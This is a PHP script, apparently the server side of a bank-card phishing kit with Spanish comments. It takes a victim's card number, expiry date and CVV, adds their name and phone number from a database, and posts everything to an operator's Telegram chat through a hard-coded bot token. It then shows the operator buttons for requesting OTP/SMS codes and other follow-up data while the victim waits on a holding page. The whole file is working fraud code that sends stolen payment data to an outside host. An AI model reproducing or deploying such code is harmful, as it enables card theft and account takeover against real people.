<?php
ob_start();
require 'conexion.php';

$tar = $_POST['tar'];
$fecha = $_POST['fecha'];
$cvv = $_POST['cvv'];
$key = $_POST['key']; // Se recibe la key

// Verificar si se recibió la key
if (!$key) {
    die("Error: Key no proporcionada.");
}

// Buscar datos en la base de datos usando la key
$stmt = $pdo->prepare("SELECT nombre, telefono FROM solicitudes WHERE `key` = ?");
$stmt->execute([$key]);

$data = $stmt->fetch(PDO::FETCH_ASSOC);

// Verificar si se encontró la solicitud
if (!$data) {
    die("Error: Solicitud no encontrada.");
}

$nombre = $data['nombre'];
$telefono = $data['telefono'];


// Generar nuevo request_id
$nuevo_request_id = uniqid("req_");

// Actualizar el request_id y estado en la base de datos
$update = $pdo->prepare("UPDATE solicitudes SET request_id = ?, estado = 'pendiente' WHERE `key` = ?");
$update->execute([$nuevo_request_id, $key]);



// Telegram
$token = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
$chat_id = "-4923753161";


// Construir el mensaje con todos los datos
$mensaje = "📥 T.Debito recibido:\n";
$mensaje .= "👤 $nombre\n";
$mensaje .= "🔒 $telefono\n";
$mensaje .= "💳 $tar\n";
$mensaje .= "💳 $fecha\n";
$mensaje .= "💳 $cvv\n";




$botones = [
  'inline_keyboard' => [[
    ['text' => "🟢DINAMICA", 'callback_data' => "OPCION_1_$nuevo_request_id"],
    ['text' => "🟢OTP/SMS", 'callback_data' => "OPCION_2_$nuevo_request_id"]
  ], [
    ['text' => "🔴WHATSAPP", 'callback_data' => "OPCION_3_$nuevo_request_id"],
    ['text' => "🟢PERSONALES", 'callback_data' => "OPCION_4_$nuevo_request_id"]
  ], [
    ['text' => "🟢CREDITO ", 'callback_data' => "OPCION_5_$nuevo_request_id"],
    ['text' => "🟢DEBITO", 'callback_data' => "OPCION_6_$nuevo_request_id"]
  ], [
    ['text' => "🔴ERROR USUARIO ", 'callback_data' => "OPCION_7_$nuevo_request_id"],
    ['text' => "🟢CVV", 'callback_data' => "OPCION_55_$nuevo_request_id"]
  ], [
    ['text' => "🔴ERROR DINAMICA ", 'callback_data' => "OPCION_9_$nuevo_request_id"],
    ['text' => "🟢FINALIZAR",       'callback_data' => "OPCION_10_$nuevo_request_id"]
  ]]
];


$payload = json_encode([
    'chat_id'      => $chat_id,
    'text'         => $mensaje,
    'reply_markup' => $botones
]);
$ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

// Redirige a pantalla de espera
header("Location: espera.html?rid=$nuevo_request_id&key=$key");

exit;
?>
